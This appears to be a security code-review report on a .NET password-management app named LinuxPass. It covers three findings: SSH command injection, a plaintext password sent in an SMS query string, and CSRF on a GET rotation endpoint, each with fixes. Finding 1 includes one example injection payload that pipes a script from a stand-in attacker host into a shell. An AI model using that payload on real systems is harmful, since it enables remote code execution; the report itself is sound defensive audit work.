# Code Review Findings Follow-up 10

## Finding 1: Remote command injection through unquoted SSH command arguments
- Severity: high
- Confidence: high

### Summary
User-controlled fields are interpolated directly into shell commands executed over SSH, allowing an authenticated user to inject arbitrary commands on managed servers.

### Evidence
`PasswordsController.Create` accepts `Username` and `Servername` directly from the request and passes them to `AddUserService.AddUser` without any allowlist or escaping (`LinuxPass/Controllers/PasswordsController.cs:88-111`). `AddUserService.AddUser` then builds the remote command with string interpolation:

```csharp
var command = client.CreateCommand($"sudo useradd -m {username} && echo '{username}:{password}' | sudo chpasswd");
```

(`LinuxPass/Services/AddUserService.cs:24`)

Because `username` is inserted unquoted in the `useradd` invocation, payloads such as `evil; curl attacker/p.sh|sh #` are executed by the remote shell instead of being treated as a literal username. The same pattern exists in `AddServerService.ResetPass`, where `username` is interpolated multiple times into a `sudo`/`tee` command (`LinuxPass/Services/AddServerService.cs:22`) and is reachable from the server create/edit forms (`LinuxPass/Controllers/ServersController.cs:70-89`, `130-147`).

### Impact
Any authenticated user who can create a password entry or register/edit a server can achieve arbitrary command execution on the target Linux hosts with the privileges of the SSH account used by the application, which appears intended to configure sudoers and rotate accounts.

### Recommendation
Strictly validate remote account/server identifiers against a conservative allowlist (for example `^[a-z_][a-z0-9_-]{0,31}$` for usernames where appropriate) before they reach the service layer, and avoid shell interpolation entirely. Prefer invoking remote commands with safely quoted arguments or a wrapper script that accepts arguments through a mechanism that does not reparse shell metacharacters.

## Finding 2: Password exfiltration over query string in SMS sender
- Severity: high
- Confidence: high

### Summary
The SMS feature appends the decrypted password directly into a GET query string, which exposes credentials to logs, proxies, browser history, and third-party infrastructure.

### Evidence
`PasswordsController.SendSMS` decrypts the stored password and passes the plaintext to `SendSMSService.SendSMSAsync` (`LinuxPass/Controllers/PasswordsController.cs:180-193`). `SendSMSService` then constructs the request as:

```csharp
string url = $"{apiUrl}?SMSMessage={encodedMessage}{decryptedPassword}&SMSPhone={smsPhone}&SMSSendMethod={smsSendMethod}&RequestorID={requestorID}";
HttpResponseMessage response = await client.GetAsync(url);
```

(`LinuxPass/Services/SendSMSService.cs:25-31`)

Only the configured prefix message is URL-encoded; the password itself is concatenated into the URL. Every SMS send therefore places the full plaintext credential into the outbound request target.

### Impact
Managed account passwords can be disclosed through application logs, reverse proxies, gateway access logs, APM tooling, browser/network debugging, or the downstream SMS provider's request logging. This undermines the application's core secret-management purpose.

### Recommendation
Do not transmit secrets in URLs. If SMS delivery is truly required, send the payload in the HTTP request body over POST and ensure the entire message is encoded as form or JSON data. Reassess whether sending passwords over SMS is acceptable at all, and prefer one-time retrieval links or out-of-band reset workflows.

## Finding 3: State-changing password rotation exposed as GET enables CSRF
- Severity: medium
- Confidence: high

### Summary
The server password rotation action is exposed as a GET endpoint and linked directly from the index page, so a cross-site request can trigger credential rotation without user intent.

### Evidence
`ServersController.Rotate` performs a full password reset workflow, including SSH access and database updates, but lacks `[HttpPost]` and `[ValidateAntiForgeryToken]` (`LinuxPass/Controllers/ServersController.cs:195-216`). The index view invokes it through a normal anchor tag:

```html
<a asp-action="Rotate" asp-route-id="@item.Id" class="btn btn-outline-success btn-sm">
```

(`LinuxPass/Views/Servers/Index.cshtml:58-60`)

Because the application uses cookie-based authenticated sessions, any external page can embed a link or auto-load the rotation URL and the browser will include the victim's authentication cookies.

### Impact
An attacker can force an authenticated operator to rotate passwords on arbitrary managed servers, causing denial of service for legitimate users and potentially triggering unplanned credential changes across infrastructure.

### Recommendation
Restrict rotation to POST only, require anti-forgery validation, and trigger it from a form/button rather than a navigational link. Consider adding an explicit confirmation step and auditing for similar state-changing GET endpoints.
